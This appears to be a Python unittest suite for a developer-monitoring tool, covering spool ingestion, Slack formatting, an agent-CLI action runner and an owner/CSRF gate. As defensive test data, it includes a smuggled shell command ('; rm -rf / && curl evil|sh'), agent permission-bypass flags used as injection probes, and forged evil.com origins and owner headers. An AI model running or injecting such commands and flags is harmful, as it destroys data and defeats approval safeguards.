#!/usr/bin/env python3
"""Message, spool, owner-gate and retained execution regression tests."""
import json

import contextlib

import importlib.util

import io

import itertools

import os

import re

import stat

import sqlite3

import subprocess

import tempfile

import threading

import unittest

import unittest.mock

from datetime import timedelta

import devmon_messages as MSG

import devmon_spool

import devmon_owner

import action_runner

import devmon_slack

AC = {str(number): 0 for number in range(1, 5)}
AC['15'] = {'malformed_quarantined': 0, 'duplicate_rejected': 0, 'legacy_valid': 0}

def fresh_db():
    path = os.path.join(tempfile.mkdtemp(prefix='devmon-db-'),'messages.db')
    MSG._local = threading.local()          # Discard the previous test's thread-local connection
    MSG.init_db(path)
    return path

def msg(event_id='resource-1', group_key='resource:disk', kind='action',
        urgency='normal', created=None, **extra):
    p = {
        'id': event_id, 'group': group_key,
        'source': 'resource', 'level': urgency,
        'title': 'Disk 92%', 'body': 'Clean up?',
        'created_at': created or MSG.iso(MSG.now_utc()),
    }
    if kind == 'action':
        p['run'] = {'cwd': '/tmp/project', 'prompt': 'Clean this up'}
    elif kind == 'link':
        p['link'] = {'url': 'https://github.com/example-org/project/pull/142',
                     'label': 'PR #142'}
    p.update(extra)
    return p

class TestSpool(unittest.TestCase):
    def setUp(self):
        fresh_db()
        self.spool = tempfile.mkdtemp()
        devmon_spool.ensure_dirs(self.spool)

    def _drop(self, name, content):
        """Simulate link(2) publication: tmp write → link → tmp unlink."""
        tmp = os.path.join(self.spool, 'tmp', 'x')
        with open(tmp, 'w') as f:
            f.write(content)
        os.link(tmp, os.path.join(self.spool, 'new', name))
        os.remove(tmp)

    def test_normal_ingest(self):
        self._drop('resource-1.json', json.dumps(msg(event_id='resource-1')))
        r = devmon_spool.scan_once(self.spool)
        self.assertEqual(r['inserted'], 1)
        self.assertEqual(os.listdir(os.path.join(self.spool, 'new')), [])   # consumed

    def test_symlink_rejected(self):
        target = os.path.join(self.spool, 'tmp', 'secret')
        with open(target, 'w') as f:
            f.write('secret')
        os.symlink(target, os.path.join(self.spool, 'new', 'resource-1.json'))
        r = devmon_spool.scan_once(self.spool)
        self.assertEqual(r['bad'], 1)
        self.assertEqual(r['inserted'], 0)

    def test_fifo_rejected(self):
        os.mkfifo(os.path.join(self.spool, 'new', 'resource-1.json'))
        r = devmon_spool.scan_once(self.spool)
        self.assertEqual(r['bad'], 1)

    def test_oversize_rejected(self):
        big = msg(event_id='resource-1')
        big['body'] = 'x' * (MSG.MAX_PAYLOAD + 100)
        self._drop('resource-1.json', json.dumps(big))
        r = devmon_spool.scan_once(self.spool)
        self.assertEqual(r['bad'], 1)

    def test_filename_mismatch_rejected(self):
        self._drop('wrong-name.json', json.dumps(msg(event_id='resource-1')))
        r = devmon_spool.scan_once(self.spool)
        self.assertEqual(r['bad'], 1)

    def test_no_clobber_link(self):
        self._drop('resource-1.json', json.dumps(msg(event_id='resource-1')))
        # a second link with the same name → EEXIST (producer contract: deduplication)
        tmp = os.path.join(self.spool, 'tmp', 'y')
        with open(tmp, 'w') as f:
            f.write('{}')
        with self.assertRaises(FileExistsError):
            os.link(tmp, os.path.join(self.spool, 'new', 'resource-1.json'))
        os.remove(tmp)

    def test_processing_leftover_recovered(self):
        # a processing/ leftover (crash simulation) → scan returns it to new for reprocessing
        self._drop('resource-1.json', json.dumps(msg(event_id='resource-1')))
        os.rename(os.path.join(self.spool, 'new', 'resource-1.json'),
                  os.path.join(self.spool, 'processing', 'resource-1.json'))
        r = devmon_spool.scan_once(self.spool)
        self.assertEqual(r['inserted'], 1)

    def test_hardened_startup_preserves_exact_cross_uid_modes(self):
        for name, mode in (('', 0o710), ('tmp', 0o3770), ('new', 0o3770),
                           ('processing', 0o700), ('bad', 0o700)):
            path = os.path.join(self.spool, name) if name else self.spool
            os.chmod(path, mode)
        with unittest.mock.patch.dict(os.environ,
                                      {'AIRLOCK_DEV_MONITOR_MESSAGES': 'true'}):
            devmon_spool.ensure_dirs(self.spool)
        self.assertEqual(stat.S_IMODE(os.stat(self.spool).st_mode), 0o710)
        self.assertEqual(stat.S_IMODE(os.stat(os.path.join(self.spool, 'tmp')).st_mode),
                         0o3770)

    def test_hardened_startup_rejects_mode_drift(self):
        os.chmod(self.spool, 0o710)
        with unittest.mock.patch.dict(os.environ,
                                      {'AIRLOCK_DEV_MONITOR_MESSAGES': 'true'}):
            with self.assertRaisesRegex(RuntimeError, 'mode mismatch'):
                devmon_spool.ensure_dirs(self.spool)

    def test_retained_snapshot_survives_writer_descriptor_and_bad_duplicate(self):
        path=os.path.join(self.spool,'new','resource-1.json')
        with open(path,'w+') as writer:
            original=json.dumps(msg())
            writer.write(original);writer.flush()
            self.assertEqual(devmon_spool.scan_once(self.spool)['inserted'],1)
            writer.seek(0);writer.write('changed by writer');writer.truncate();writer.flush()
        retained=os.path.join(self.spool,'processing','resource-1.json')
        with open(retained) as handle: self.assertEqual(handle.read(),original)
        self._drop('resource-1.json','{}')
        self.assertEqual(devmon_spool.scan_once(self.spool)['bad'],1)
        with open(retained) as handle: self.assertEqual(handle.read(),original)
        reasons=[name for name in os.listdir(os.path.join(self.spool,'bad')) if name.endswith('.reason')]
        self.assertEqual(len(reasons),1)
        self.assertEqual(devmon_spool.scan_once(self.spool)['inserted'],0)

    def test_surrogate_is_quarantined_once_then_normal_collection_and_send_continue(self):
        import devmon_loop
        import http.server
        self._drop('kept.json',json.dumps(msg(event_id='kept',group_key='kept',kind='info')))
        self.assertEqual(devmon_spool.scan_once(self.spool)['inserted'],1)
        retained=os.path.join(self.spool,'processing','kept.json')
        with open(retained,'rb') as handle: original=handle.read()
        bad=msg(event_id='sur-1',group_key='g',kind='info',title='x'+chr(0xd83d))
        self._drop('sur-1.json',json.dumps(bad))
        for iteration in range(3):
            counts=devmon_spool.scan_once(self.spool)
            self.assertEqual(counts['bad'],1 if iteration==0 else 0)
            self.assertEqual(len(os.listdir(os.path.join(self.spool,'bad'))),2)
            self.assertEqual(os.listdir(os.path.join(self.spool,'processing')),['kept.json'])
            self.assertFalse(MSG.has_receipt('sur-1'))
            with open(retained,'rb') as handle: self.assertEqual(handle.read(),original)
        self._drop('next.json',json.dumps(msg(event_id='next',group_key='next',kind='info',urgency='urgent')))
        posts=[]
        class Recorder(http.server.BaseHTTPRequestHandler):
            def do_POST(self):
                posts.append(self.rfile.read(int(self.headers['Content-Length'])))
                self.send_response(200);self.end_headers()
            def log_message(self,*args): pass
        server=http.server.HTTPServer(('127.0.0.1',0),Recorder)
        worker=threading.Thread(target=server.serve_forever,daemon=True);worker.start()
        try:
            self.assertEqual(devmon_spool.scan_once(self.spool)['inserted'],1)
            self.assertTrue(devmon_loop.deliver_once('http://127.0.0.1:%d/hook'%server.server_port))
            self.assertEqual(len(posts),1)
            self.assertIsNotNone(MSG.get_card('next')['sent_at'])
            self.assertTrue(MSG.has_receipt('kept'))
        finally:
            server.shutdown();server.server_close();worker.join()
        print('SURROGATE: scan bad=1/0/0; quarantine files=2/2/2; own snapshot=0; prior receipt preserved; next card1 POST1 sent1')

    def test_database_busy_keeps_replayable_file_and_next_collection_works(self):
        self._drop('resource-1.json',json.dumps(msg()))
        for error in (sqlite3.OperationalError('busy'),sqlite3.OperationalError('database or disk is full')):
            with unittest.mock.patch.object(MSG,'ingest',side_effect=error):
                self.assertEqual(devmon_spool.scan_once(self.spool)['deferred'],1)
        self.assertTrue(os.path.exists(os.path.join(self.spool,'processing','resource-1.json')))
        self.assertEqual(devmon_spool.scan_once(self.spool)['inserted'],1)
        self.assertEqual(MSG._conn().execute('SELECT COUNT(*) FROM ledger').fetchone()[0],1)

class TestStateDirectoryModes(unittest.TestCase):
    def test_hardened_db_start_preserves_0710(self):
        with tempfile.TemporaryDirectory() as state:
            os.chmod(state, 0o710)
            MSG._local = threading.local()
            with unittest.mock.patch.dict(os.environ,
                                          {'AIRLOCK_DEV_MONITOR_MESSAGES': 'true'}):
                MSG.init_db(os.path.join(state, 'messages.db'))
            self.assertEqual(stat.S_IMODE(os.stat(state).st_mode), 0o710)

    def test_default_db_start_reapplies_0700(self):
        with tempfile.TemporaryDirectory() as state:
            os.chmod(state, 0o755)
            MSG._local = threading.local()
            with unittest.mock.patch.dict(os.environ, {}, clear=False):
                os.environ.pop('AIRLOCK_DEV_MONITOR_MESSAGES', None)
                MSG.init_db(os.path.join(state, 'messages.db'))
            self.assertEqual(stat.S_IMODE(os.stat(state).st_mode), 0o700)


class TestSlack(unittest.TestCase):
    def setUp(self):
        fresh_db()

    def test_send_returns_raw_http_contract_without_body_or_url(self):
        response = unittest.mock.MagicMock()
        response.__enter__.return_value = response
        response.status = 204
        response.headers = {'Retry-After': '7'}
        with unittest.mock.patch.object(
                devmon_slack.urllib.request, 'urlopen', return_value=response):
            self.assertEqual(
                devmon_slack.send('https://secret.example/hook', 'hello'),
                (True, 204, '7'))

        http_error = devmon_slack.urllib.error.HTTPError(
            'https://secret.example/hook', 429, 'secret response message',
            {'Retry-After': '17'}, io.BytesIO(b'secret response body'))
        with unittest.mock.patch.object(
                devmon_slack.urllib.request, 'urlopen', side_effect=http_error):
            result = devmon_slack.send('https://secret.example/hook', 'hello')
        self.assertEqual(result, (False, 429, '17'))
        self.assertNotIn('secret.example', repr(result))
        self.assertNotIn('response body', repr(result))

    def test_send_network_failure_returns_type_only(self):
        failure = devmon_slack.urllib.error.URLError(
            'https://secret.example/hook response-body-secret')
        stderr = io.StringIO()
        with unittest.mock.patch.object(
                devmon_slack.urllib.request, 'urlopen', side_effect=failure), \
                contextlib.redirect_stderr(stderr):
            result = devmon_slack.send('https://secret.example/hook', 'hello')
        self.assertEqual(result, (False, 'URLError', None))
        self.assertEqual(stderr.getvalue(), '')
        self.assertNotIn('secret.example', repr(result))
        self.assertNotIn('response-body-secret', repr(result))

    def test_format_text_has_title_no_url_leak(self):
        card = {'title': 'TUrgent', 'source': 's', 'kind': 'action',
                'level': 'urgent', 'count': 3,
                'body': 'The disk is full.\nBackups may stop.'}
        t = devmon_slack.format_text(card, 'https://monitor.example.test/dev-monitor.html#messages')
        self.assertIn('TUrgent', t)
        self.assertIn('×3', t)
        self.assertIn('Open in the console', t)
        self.assertIn('The disk is full.', t)
        self.assertIn('• Backups may stop.', t)

    def test_format_text_orders_body_then_console(self):
        card = {'title': 'T', 'source': 's', 'kind': 'action', 'level': 'urgent',
                'body': 'Current state\n• What could be lost'}
        text = devmon_slack.format_text(card, 'https://monitor.example.test/messages')
        self.assertLess(text.index('Current state'), text.index('What could be lost'))
        self.assertLess(text.index('What could be lost'), text.index('Open in the console'))

    def test_format_text_escapes_body_source_and_title(self):
        card = {'title': '<!channel> & title', 'source': '<!here>',
                'kind': '<https://bad.example|notice>', 'level': 'urgent',
                'body': 'State <!channel> & <https://bad.example|click>\nImpact <@U123>'}
        text = devmon_slack.format_text(card)
        for unsafe in ('<!channel>', '<!here>', '<https://bad.example|notice>',
                       '<https://bad.example|click>', '<@U123>', '<!everyone>'):
            self.assertNotIn(unsafe, text)
        self.assertIn('&lt;!channel&gt; &amp; title', text)
        self.assertIn('State &lt;!channel&gt; &amp; &lt;https://bad.example|click&gt;', text)

    def test_format_text_states_item_and_character_omission_counts(self):
        items = ['item-%d' % i for i in range(devmon_slack.MAX_BODY_ITEMS + 3)]
        text = devmon_slack.format_text({
            'title': 'T', 'source': 's', 'kind': 'info',
            'body': '\n'.join(items),
        })
        for item in items[:devmon_slack.MAX_BODY_ITEMS]:
            self.assertIn(item, text)
        for item in items[devmon_slack.MAX_BODY_ITEMS:]:
            self.assertNotIn(item, text)
        self.assertIn('(3 more items omitted)', text)

        over = 'x' * (devmon_slack.MAX_DETAIL_CHARS + 17)
        text = devmon_slack.format_text({
            'title': 'T', 'source': 's', 'kind': 'action',
            'body': over,
        })
        self.assertIn('(17 chars omitted)', text)

    def test_format_text_old_dict_missing_body_and_action_is_unchanged(self):
        card = {'title': 'Legacy', 'source': 's', 'kind': 'info',
                'level': 'normal', 'count': 3}
        self.assertEqual(
            devmon_slack.format_text(card, 'https://monitor.example.test/messages'),
            '• *Legacy*\ns ×3\n'
            '<https://monitor.example.test/messages|Open in the console>')

    def test_slack_title_mrkdwn_escaped(self):
        # #9: escape <!channel> and <url|disguise> in a semi-trusted title so mrkdwn does not interpret them
        card = {'title': '<!channel> deploy failed <https://evil|details>', 'source': 's',
                'kind': 'info', 'level': 'urgent', 'count': 1}
        t = devmon_slack.format_text(card, '')
        self.assertNotIn('<!channel>', t)
        self.assertNotIn('<https://evil|details>', t)
        self.assertIn('&lt;!channel&gt;', t)


class TestRunner(unittest.TestCase):
    def test_prompt_is_single_argv_element(self):
        # even a prompt containing shell metacharacters is one argv element after '--' — no shell parsing (zero injection)
        argv = action_runner.build_argv({'cwd': '/x', 'prompt': '; rm -rf / && curl evil|sh'})
        self.assertIn('--', argv)
        self.assertEqual(argv[-1], '; rm -rf / && curl evil|sh')         # one element after '--'
        self.assertEqual(argv.index('--'), len(argv) - 2)


    def test_prompt_cannot_inject_cli_flag(self):
        # 🔴 #2: '--dangerously-skip-permissions' prompt is after '--', so it is positional rather than a CLI option
        argv = action_runner.build_argv({'cwd': '/x', 'prompt': '--dangerously-skip-permissions'})
        self.assertIn('--', argv)
        self.assertEqual(argv[-1], '--dangerously-skip-permissions')     # positional prompt
        self.assertEqual(argv.index('--'), len(argv) - 2)                # the prompt immediately follows '--'
        # there is no dangerous flag before '--'
        self.assertNotIn('--dangerously-skip-permissions', argv[:argv.index('--')])

    def test_resolve_cwd_under_root_ok(self):
        root = tempfile.mkdtemp()
        sub = os.path.join(root, 'proj'); os.mkdir(sub)
        self.assertEqual(action_runner.resolve_cwd_under_root(sub, root), os.path.realpath(sub))

    def test_resolve_cwd_escape_rejected(self):
        root = tempfile.mkdtemp(); outside = tempfile.mkdtemp()
        with self.assertRaises(ValueError):
            action_runner.resolve_cwd_under_root(outside, root)

    def test_sentinel_atomic(self):
        d = tempfile.mkdtemp()
        action_runner.write_sentinel(d, 'run-1', 3)
        with open(os.path.join(d, 'run-1.done')) as f:
            self.assertEqual(json.load(f)['exit_code'], 3)
        self.assertFalse(os.path.exists(os.path.join(d, 'run-1.tmp')))

    # --- PATH augmentation (🔴 2026-07-30 rc=127 regression) --------------------------------
    # tmux server env = systemd --user PATH → missing `~/.local/bin` → `claude` cannot resolve,
    # so all approved runs return 127. The following three tests catch that regression.

    def test_runtime_env_prepends_user_bin(self):
        env = {'PATH': '/usr/bin:/bin'}
        with unittest.mock.patch.dict(os.environ, env, clear=True):
            got = action_runner.runtime_env()['PATH'].split(os.pathsep)
        self.assertEqual(got[0], os.path.join(os.path.expanduser('~'), '.local', 'bin'))
        self.assertIn('/usr/bin', got)                       # the existing PATH is preserved

    def test_runtime_env_no_duplicate(self):
        userbin = os.path.join(os.path.expanduser('~'), '.local', 'bin')
        with unittest.mock.patch.dict(os.environ, {'PATH': userbin + ':/bin'}, clear=True):
            got = action_runner.runtime_env()['PATH'].split(os.pathsep)
        self.assertEqual(got.count(userbin), 1)

    def test_resolve_exe_finds_user_bin_only_executable(self):
        # an executable in ~/.local/bin must resolve even on an execution path that does not pass through a login shell
        home = tempfile.mkdtemp()
        ubin = os.path.join(home, '.local', 'bin'); os.makedirs(ubin)
        fake = os.path.join(ubin, 'claude-test-stub')
        with open(fake, 'w') as f:
            f.write('#!/bin/sh\nexit 0\n')
        os.chmod(fake, 0o755)
        with unittest.mock.patch.dict(os.environ, {'HOME': home, 'PATH': '/usr/bin:/bin'},
                                      clear=True):
            env = action_runner.runtime_env()
            self.assertEqual(action_runner.resolve_exe(['claude-test-stub'], env), fake)
            with self.assertRaises(FileNotFoundError) as cm:
                action_runner.resolve_exe(['no-such-exe-xyz'], env)
        self.assertIn('no-such-exe-xyz', str(cm.exception))   # what was requested
        self.assertIn('PATH=', str(cm.exception))             # where it was searched (No Silent Failure)


class TestRunnerAgent(unittest.TestCase):
    """Which agent CLI the runner starts, and what it does when it cannot find out.

    The compatibility half of this is the point: `[agent].provider` arrived after boxes were
    already running approved actions, and on those boxes the plan carries no agent at all.
    Every one of them has to keep starting claude with the same argv it always did.
    """

    CODEX = {'provider': 'codex', 'command': 'codex', 'binary': '/opt/codex',
             'reason': 'pinned'}

    def _selector(self, prints):
        """Write a fake bin/airlock-agent that prints `prints`, and return its path.

        A PYTHON file left non-executable, because that is what it stands in for: the real
        bin/airlock-agent is mode 100644 and the runner spawns an interpreter for it. A fake
        with a #!/bin/sh shebang and the executable bit would pass a runner that exec'd the
        path directly — the very thing this must not do.
        """
        d = tempfile.mkdtemp()
        path = os.path.join(d, 'airlock-agent')
        with open(path, 'w') as f:
            f.write('import sys\nsys.stdout.write(%r)\n' % prints)
        os.chmod(path, 0o644)
        return path

    def _selector_rc(self, code):
        """A fake selector that exits non-zero without printing."""
        d = tempfile.mkdtemp()
        path = os.path.join(d, 'airlock-agent')
        with open(path, 'w') as f:
            f.write('raise SystemExit(%d)\n' % code)
        os.chmod(path, 0o644)
        return path

    # ---- argv per provider ----
    def test_no_agent_in_plan_is_the_old_claude_argv(self):
        # A plan written before this key existed, and a box that never set it, are the same
        # case and must both be indistinguishable from the previous release.
        for plan in ({'cwd': '/x', 'prompt': 'hi'},
                     {'cwd': '/x', 'prompt': 'hi', 'agent': {}},
                     {'cwd': '/x', 'prompt': 'hi', 'agent': {'provider': '', 'select_bin': ''}}):
            argv = action_runner.build_argv(plan,
                                            action_runner.resolve_agent(plan.get('agent')))
            self.assertEqual(argv, ['claude', '--', 'hi'])

    def test_codex_argv_uses_exec_and_no_settings(self):
        # `--settings` is claude's flag. Passing it to codex would be a parse error, and the
        # Stop hook it installs is a claude concept codex would never fire.
        argv = action_runner.build_argv({'cwd': '/x', 'prompt': 'hi'}, self.CODEX)
        self.assertEqual(argv, ['/opt/codex', 'exec', '--', 'hi'])
        self.assertNotIn('--settings', argv)

    def test_codex_keeps_the_positional_first_input_contract(self):
        # The injection guarantee is per-provider or it is not a guarantee: the first input is
        # one argv element and it sits after '--', whichever CLI runs.
        argv = action_runner.build_argv({'cwd': '/x', 'prompt': '--dangerously-bypass-approvals-and-sandbox'},
                                        self.CODEX)
        self.assertEqual(argv.index('--'), len(argv) - 2)
        self.assertEqual(argv[-1], '--dangerously-bypass-approvals-and-sandbox')
        self.assertNotIn('--dangerously-bypass-approvals-and-sandbox', argv[:argv.index('--')])


    def test_no_provider_gets_a_model_flag(self):
        # Owner decision 5, as a test rather than a comment: the model is the CLI's to pick.
        for agent in (None, self.CODEX):
            argv = action_runner.build_argv({'cwd': '/x', 'prompt': 'hi'}, agent)
            self.assertNotIn('--model', argv)
            self.assertNotIn('-m', argv)


    # ---- resolution ----
    def test_selection_is_read_from_the_selector(self):
        # A REAL executable, because the runner now checks that the path it was handed is one
        # — a fictional path would make this pass for the wrong reason (or, as it did once,
        # fail for one).
        found = os.path.join(tempfile.mkdtemp(), 'codex')
        with open(found, 'w') as f:
            f.write('#!/bin/sh\n')
        os.chmod(found, 0o755)
        sel = self._selector('{"schema_version":1,"provider":"codex","command":"codex",'
                             '"binary":"%s","reason":"pinned"}' % found)
        agent = action_runner.resolve_agent({'provider': 'auto', 'select_bin': sel})
        self.assertEqual((agent['provider'], agent['binary']), ('codex', found))

    def test_unconfigured_plan_is_silent_but_half_configured_is_not(self):
        # 🔴 Found by adversarial review 2026-09-01. The two cases look alike and are not.
        # NEITHER field = a box that never set [agent].provider: ordinary, not an event, so a
        # line here would print on every run of every box that never opted in.
        # ONE field = a box that DID configure a provider whose selector did not arrive — the
        # likeliest cause being a unit rendered before this feature and never re-rendered.
        # That box's airlock.toml says codex while claude runs, which is the exact failure
        # this change exists to remove, so it cannot be the quiet case.
        for spec in (None, {}, {'provider': '', 'select_bin': ''}):
            err = io.StringIO()
            with contextlib.redirect_stderr(err):
                action_runner.resolve_agent(spec)
            self.assertEqual(err.getvalue(), '', spec)
        for spec in ({'provider': 'codex'}, {'select_bin': '/nonexistent/airlock-agent'}):
            err = io.StringIO()
            with contextlib.redirect_stderr(err):
                agent = action_runner.resolve_agent(spec)
            self.assertEqual(agent['provider'], 'claude', spec)
            self.assertIn('action_runner', err.getvalue(), spec)

    def test_true_is_not_schema_version_one(self):
        # 🔴 Found by adversarial review 2026-09-01: in Python `True == 1`, so a selector
        # answering `"schema_version": true` passed an `== 1` version check and its answer was
        # then trusted. Same guard learning already applies to the login-state payload.
        sel = self._selector('{"schema_version":true,"provider":"codex",'
                             '"command":"codex","binary":"/bin/sh"}')
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            agent = action_runner.resolve_agent({'provider': 'auto', 'select_bin': sel})
        self.assertEqual(agent['provider'], 'claude')
        self.assertIn('unknown schema', err.getvalue())

    def test_command_name_comes_from_this_runner_not_the_answer(self):
        # 🔴 Found by adversarial review 2026-09-01. The runner has to know each provider it
        # accepts anyway (to decide the turn-end hook), so reading the command name from its
        # own table costs nothing and removes a way for a wrong answer to name another program.
        sel = self._selector('{"schema_version":1,"provider":"codex",'
                             '"command":"sh","reason":"r"}')
        agent = action_runner.resolve_agent({'provider': 'auto', 'select_bin': sel})
        self.assertEqual(agent['command'], 'codex')
        self.assertEqual(action_runner.build_argv({'cwd': '/x', 'prompt': 'p'}, agent),
                         ['codex', 'exec', '--', 'p'])

    def test_unusable_binary_keeps_the_provider_and_drops_the_path(self):
        # A stale path must not silently become "run claude instead": on a codex box that is
        # the wrong CLI. Keep the provider, drop the path, say so — resolve_exe then searches
        # by name and reports what it looked for if that fails too.
        for named in ('/etc/hostname', 'codex', '/nonexistent/codex'):
            sel = self._selector('{"schema_version":1,"provider":"codex","command":"codex",'
                                 '"binary":"%s","reason":"r"}' % named)
            err = io.StringIO()
            with contextlib.redirect_stderr(err):
                agent = action_runner.resolve_agent({'provider': 'auto', 'select_bin': sel})
            self.assertEqual(agent['provider'], 'codex', named)
            self.assertIsNone(agent['binary'], named)
            self.assertIn('not an executable file', err.getvalue(), named)

    def test_broken_selector_falls_back_to_claude_loudly(self):
        # A selector that cannot answer must not take away a capability the box had yesterday,
        # and must not do it quietly — the pane stays open, so the reason is readable there.
        cases = {
            'missing': '/nonexistent/airlock-agent',
            'nonzero': self._selector_rc(3),
            'garbage': self._selector('not json'),
            'unknown schema': self._selector('{"schema_version":99}'),
            'unknown provider': self._selector(
                '{"schema_version":1,"provider":"gemini","command":"gemini"}'),
        }
        for label, sel in cases.items():
            err = io.StringIO()
            with contextlib.redirect_stderr(err):
                agent = action_runner.resolve_agent({'provider': 'auto', 'select_bin': sel})
            self.assertEqual(agent['provider'], 'claude', label)
            self.assertIn('action_runner', err.getvalue(), label)
            self.assertIn('claude', err.getvalue(), label)
            # and the argv is byte-for-byte the pre-key one
            self.assertEqual(action_runner.build_argv({'cwd': '/x', 'prompt': 'hi'}, agent),
                             ['claude', '--', 'hi'])

    def test_no_cli_at_all_is_reported_not_swallowed(self):
        # "nothing is installed" is an answer. Falling back to claude here would replace a
        # sentence the owner can act on with a bare rc=127.
        sel = self._selector('{"schema_version":1,"provider":null,'
                             '"binary":null,"reason":"no agent CLI is installed"}')
        with self.assertRaises(FileNotFoundError) as caught:
            action_runner.resolve_agent({'provider': 'auto', 'select_bin': sel})
        self.assertIn('no agent CLI is installed', str(caught.exception))

class FakeHeaders(dict):
    def get(self, k, default=''):
        return super().get(k, default)

class FakeHandler:
    def __init__(self, headers):
        self.headers = FakeHeaders(headers)
        self.status = None
        self.payload = None
        self.cors = None

    def _json(self, status, payload, cors=False):
        self.status = status
        self.payload = payload
        self.cors = cors

class TestOwnerGate(unittest.TestCase):
    def test_load_gate_config_none(self):
        for k in devmon_owner._GATE_REQUIRED:
            os.environ.pop(k, None)
        self.assertIsNone(devmon_owner.load_gate_config())

    def test_load_gate_config_partial_fails_closed(self):
        os.environ['DEV_MONITOR_OWNER'] = 'owner@example.test'
        os.environ.pop('DEV_MONITOR_PROXY_SECRET', None)
        with self.assertRaises(devmon_owner.ConfigError):
            devmon_owner.load_gate_config()
        os.environ.pop('DEV_MONITOR_OWNER', None)

    def test_load_gate_config_full(self):
        env = {'DEV_MONITOR_OWNER': 'owner@example.test',
               'DEV_MONITOR_PROXY_SECRET': 's3cr3t'}
        os.environ.update(env)
        self.assertEqual(devmon_owner.load_gate_config(),
                         {'owner': 'owner@example.test', 'secret': 's3cr3t'})
        for k in env:
            os.environ.pop(k, None)

    def test_load_config_none(self):
        for k in devmon_owner._REQUIRED:
            os.environ.pop(k, None)
        self.assertIsNone(devmon_owner.load_config())

    def test_load_config_partial_fails_closed(self):
        os.environ['DEV_MONITOR_OWNER'] = 'owner@example.test'
        os.environ.pop('DEV_MONITOR_PROXY_SECRET', None)
        os.environ.pop('DEV_MONITOR_SPOOL', None)
        os.environ.pop('DEV_MONITOR_DB', None)
        with self.assertRaises(devmon_owner.ConfigError):
            devmon_owner.load_config()
        os.environ.pop('DEV_MONITOR_OWNER', None)

    def test_load_config_full(self):
        env = {'DEV_MONITOR_OWNER': 'owner@example.test',
               'DEV_MONITOR_PROXY_SECRET': 's3cr3t',
               'DEV_MONITOR_SPOOL': '/tmp/spool', 'DEV_MONITOR_DB': '/tmp/db'}
        os.environ.update(env)
        cfg = devmon_owner.load_config()
        self.assertEqual(cfg['owner'], 'owner@example.test')
        for k in env:
            os.environ.pop(k, None)

    CFG = {'owner': 'owner@example.test', 'secret': 's3cr3t',
           'spool': '/tmp/s', 'db': '/tmp/d'}

    def test_require_owner_ok(self):
        h = FakeHandler({'X-Devmon-Proxy-Secret': 's3cr3t',
                         'X-Devmon-Owner': 'owner@example.test'})
        self.assertTrue(devmon_owner.require_owner(h, self.CFG))

    def test_require_owner_forged_header_fails(self):
        # a local process forges only the owner header (does not know the secret) → 403 (C1)
        h = FakeHandler({'X-Devmon-Owner': 'owner@example.test'})
        self.assertFalse(devmon_owner.require_owner(h, self.CFG))
        self.assertEqual(h.status, 403)
        self.assertNotIn('error', h.payload)                # zero response-body data
        self.assertFalse(h.cors)                            # default caller: no cross-origin echo

    def test_require_owner_wrong_owner_fails(self):
        h = FakeHandler({'X-Devmon-Proxy-Secret': 's3cr3t',
                         'X-Devmon-Owner': 'attacker@evil.com'})
        self.assertFalse(devmon_owner.require_owner(h, self.CFG))

    def test_require_owner_cors_echoed_on_403_when_requested(self):
        # messages/preview passes cors=True so a non-owner tailnet viewer (tailnet_view)
        # gets a readable rejection instead of an opaque CORS failure — see
        # apps/dev-monitor/backend/airlock-dev-monitor.py _handle_owner_get.
        h = FakeHandler({'X-Devmon-Owner': 'someone-else@example.test'})
        self.assertFalse(devmon_owner.require_owner(h, self.CFG, cors=True))
        self.assertEqual(h.status, 403)
        self.assertTrue(h.cors)

    def test_csrf_good_origin(self):
        h = FakeHandler({'Origin': 'https://monitor.example.test', 'Host': 'monitor.example.test',
                         'Content-Type': 'application/json', 'Content-Length': '2'})
        self.assertTrue(devmon_owner.check_mutating(h))

    def test_csrf_origin_with_port_same_host_ok(self):
        # :9999 short URL access — Origin includes a port while nginx Host ($host) does not → pass by ignoring the port.
        h = FakeHandler({'Origin': 'http://monitor.example.test:9999', 'Host': 'monitor.example.test',
                         'Content-Type': 'application/json', 'Content-Length': '2'})
        self.assertTrue(devmon_owner.check_mutating(h))

    def test_csrf_cross_host_with_port_rejected(self):
        # even ignoring the port, reject a different hostname (external-origin CSRF)
        h = FakeHandler({'Origin': 'https://evil.com:9999', 'Host': 'monitor.example.test',
                         'Content-Type': 'application/json', 'Content-Length': '2'})
        self.assertFalse(devmon_owner.check_mutating(h))
        self.assertEqual(h.status, 403)

    def test_csrf_cross_origin_rejected(self):
        h = FakeHandler({'Origin': 'https://evil.com', 'Host': 'monitor.example.test',
                         'Content-Type': 'application/json', 'Content-Length': '2'})
        self.assertFalse(devmon_owner.check_mutating(h))
        self.assertEqual(h.status, 403)

    def test_csrf_missing_origin_rejected(self):
        h = FakeHandler({'Host': 'monitor.example.test', 'Content-Type': 'application/json',
                         'Content-Length': '2'})
        self.assertFalse(devmon_owner.check_mutating(h))

    def test_csrf_non_json_rejected(self):
        h = FakeHandler({'Origin': 'https://monitor.example.test', 'Host': 'monitor.example.test',
                         'Content-Type': 'text/plain', 'Content-Length': '2'})
        self.assertFalse(devmon_owner.check_mutating(h))
        self.assertEqual(h.status, 415)

    def test_csrf_oversize_rejected(self):
        h = FakeHandler({'Origin': 'https://monitor.example.test', 'Host': 'monitor.example.test',
                         'Content-Type': 'application/json',
                         'Content-Length': str(devmon_owner.MAX_BODY + 1)})
        self.assertFalse(devmon_owner.check_mutating(h))
        self.assertEqual(h.status, 413)

class TestCards(unittest.TestCase):
    def setUp(self):
        fresh_db()

    def test_level_alias_and_idempotence(self):
        payload = msg(kind='info', urgency='urgent')
        payload['urgency'] = payload.pop('level')
        self.assertEqual(MSG.ingest(payload), 'inserted')
        self.assertEqual(MSG.ingest(payload), 'duplicate')
        card = MSG.feed()['messages'][0]
        self.assertEqual((card['level'], card['count']), ('urgent', 1))
        self.assertEqual(MSG._conn().execute('SELECT count(*) FROM cards WHERE send_next_at IS NOT NULL').fetchone()[0], 1)

    def test_conflicting_alias_rejected_before_receipt(self):
        with self.assertRaises(MSG.ValidationError):
            MSG.ingest(dict(msg(), urgency='urgent'))
        self.assertEqual(MSG._conn().execute('SELECT count(*) FROM ledger').fetchone()[0], 0)

    def test_coalescing_promotion_and_read_revival(self):
        MSG.ingest(msg(kind='info'))
        MSG.mark_read('resource-1')
        MSG.ingest(msg(event_id='second',kind='info',urgency='urgent'))
        self.assertIsNotNone(MSG.get_card('resource-1')['read_at'])
        MSG.ingest(msg(event_id='third',kind='info',title='Disk 93%'))
        card = MSG.feed()['messages'][0]
        self.assertEqual((card['level'],card['count'],card['read_at']),('urgent',3,None))
